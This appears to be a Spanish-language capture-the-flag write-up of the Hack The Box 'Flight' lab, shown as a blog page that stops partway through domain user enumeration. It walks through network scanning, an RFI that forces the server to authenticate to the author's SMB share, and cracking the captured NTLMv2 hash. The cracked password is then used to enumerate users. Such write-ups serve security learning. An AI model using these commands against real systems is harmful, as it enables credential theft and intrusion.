<!DOCTYPE html>













<html lang="es-ES"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  
    

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Flight WriteUp" />
<meta name="author" content="H4ckerLite" />
<meta property="og:locale" content="es_ES" />
<meta name="description" content="Bio" />
<meta property="og:description" content="Bio" />
<link rel="canonical" href="http://localhost:4000/posts/fligth-writeup/" />
<meta property="og:url" content="http://localhost:4000/posts/fligth-writeup/" />
<meta property="og:site_name" content="H4ckerLite Blog" />
<meta property="og:image" content="http://localhost:4000/assets/img/commons/Flight-writeup/Flight.png" />
<meta property="og:image:alt" content="Flight WriteUp" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-23T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/Flight-writeup/Flight.png" />
<meta name="twitter:image:alt" content="Flight WriteUp" />
<meta property="twitter:title" content="Flight WriteUp" />
<meta name="twitter:site" content="@mortzelo" />
<meta name="twitter:creator" content="@H4ckerLite" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-23T17:00:00+01:00","datePublished":"2023-03-23T17:00:00+01:00","description":"Bio","headline":"Flight WriteUp","image":{"alt":"Flight WriteUp","url":"http://localhost:4000/assets/img/commons/Flight-writeup/Flight.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/fligth-writeup/"},"url":"http://localhost:4000/posts/fligth-writeup/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Flight WriteUp | H4ckerLite | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="H4ckerLite | Blog">
<meta name="application-name" content="H4ckerLite | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/favicons/avatar.ico" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">H4ckerLite | Blog</a>
    </div>
    <div class="site-subtitle font-italic">WriteUps, Pentesting</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>INICIO</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORÍAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ETIQUETAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ACERCA DE</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVO</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/H4ckerLite" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/mortzelo" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
        target="_blank" rel="noopener">
        <i class="fas fa-cube"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Inicio
            </a>
          </span>

        

      

        

      

        

          
            <span>Flight WriteUp</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Entrada
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Buscar...">
    </span>
    <span id="search-cancel" >Cancelar</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->





<h1 data-toc-skip>Flight WriteUp</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Publicado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1679587200"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-03-23
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="../../assets/img/commons/Flight-writeup/Flight.png" class="preview-img bg"
        alt="Flight WriteUp"

      

       data-proofer-ignore>

      
        <figcaption class="text-center pt-2 pb-2">Flight WriteUp</figcaption>
      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author -->
    <span>
      
      

      

      Por

      <em>
        
        H4ckerLite
        
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3077 palabras">
  <em>17 min</em> de lectura</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Bio</p>

<h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="nmap-scan"><span class="mr-2">NMAP Scan</span><a href="#nmap-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Realizando un NMAP Scan vemos.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>❯ nmap 10.10.11.187
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-06 18:55 <span class="nt">-04</span>
Stats: 0:00:01 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.80% <span class="k">done
</span>Nmap scan report <span class="k">for </span>10.10.11.187
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 988 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
</pre></td></tr></tbody></table></code></div></div>
<p>Viendo los puertos <strong>53</strong> y <strong>88</strong> me indican que es un <code class="language-plaintext highlighter-rouge">DC</code></p>

<p>Mirando el servidor vemos un dominio.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> 10.10.11.187 | html2text | <span class="nb">tail</span> <span class="nt">-n3</span>
Copyright 2022 flight.htb - All Rights Reserved
Designed by Geiseric &amp; JDgodd
</pre></td></tr></tbody></table></code></div></div>

<p>lo añadimos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="s1">'10.10.11.187    flight.htb'</span> | <span class="nb">tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.187    flight.htb
</pre></td></tr></tbody></table></code></div></div>
<p>Al aplicar FUZZING no vemos nada interesante, buscamos subdominios</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>❯ gobuster vhost <span class="nt">-w</span> /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  <span class="nt">-t</span> 300 <span class="nt">-u</span> flight.htb 2&gt;/dev/null
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:          http://flight.htb
<span class="o">[</span>+] Method:       GET
<span class="o">[</span>+] Threads:      300
<span class="o">[</span>+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
<span class="o">[</span>+] User Agent:   gobuster/3.1.0
<span class="o">[</span>+] Timeout:      10s
<span class="o">===============================================================</span>
2023/04/06 19:10:12 Starting gobuster <span class="k">in </span>VHOST enumeration mode
<span class="o">===============================================================</span>
Found: school.flight.htb <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3996]
<span class="o">===============================================================</span>
2023/04/06 19:10:25 Finished
<span class="o">===============================================================</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Lo añadimos al /etc/hosts….</p>

<p>Haciendo hovering sobre las pestañas vemos que lee el archivo por el parametro view?=</p>

<p><img data-src="/assets/img/commons/Flight-writeup/1.png" alt="Hacker " class="center-image" data-proofer-ignore>
<em>Image</em></p>
<h2 id="intrusión"><span class="mr-2">Intrusión</span><a href="#intrusión" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Esto huele a <code class="language-plaintext highlighter-rouge">LFI</code>, En lugar de intentar leer archivos podemos realizar un RFI a un servidor SMB loca, estó realizará una autenticación y nos mostrará el hash NTLMv2 del usuario que corre el servicio.</p>

<p>Nos creamos un servidor SMB con soporte para la versión 2.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>❯ impacket-smbserver pwned  <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</pre></td></tr></tbody></table></code></div></div>
<p>Mediante una petición obtendremos el Hash NTLMv2.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://school.flight.htb/?view=//10.10.14.97/pwned"</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Y lo veremos frente a nuestros ojos.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>❯ impacket-smbserver pwned  <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.187,52807<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>flight<span class="se">\s</span>vc_apache,G0<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User G0<span class="se">\s</span>vc_apache authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> svc_apache::flight:aaaaaaaaaaaaaaaa:62e323993fba7b01d7444bf4bdcc6c5b:01010000000000008075c293e368d901efb22a5fac2b3e9100000000010010004a00410054004e007800450056007600030010004a00410054004e0078004500560076000200100078005900700076006a0068006b0067000400100078005900700076006a0068006b006700070008008075c293e368d9010600040002000000080030003000000000000000000000000030000081294c43d7cd65ed148da6b446d86fa48a22e78a3c88765b131783f7454f633b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390037000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.187,52807<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Lo copiamos en un fichero y lo intentamos crakear.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
S@Ss!K@<span class="k">*</span>t13      <span class="o">(</span>svc_apache<span class="o">)</span>
1g 0:00:00:11 DONE <span class="o">(</span>2023-04-06 19:59<span class="o">)</span> 0.09041g/s 964189p/s 964189c/s 964189C/s SADSAM..S42150461
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed
</pre></td></tr></tbody></table></code></div></div>
<p>Mediante crackmapexec podemos ver que son correctas.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> svc_apache <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
</pre></td></tr></tbody></table></code></div></div>

<p>Podemos intentar dumpear los usuarios.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> svc_apache <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--users</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] Enumerated domain user<span class="o">(</span>s<span class="o">)</span>
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\O</span>.Possum                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\s</span>vc_apache                     badpwdcount: 0 baddpwdtime: 2023-04-07 07:01:10.196129+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\V</span>.Stevens                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb<span class="se">\D</span>.Truff                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
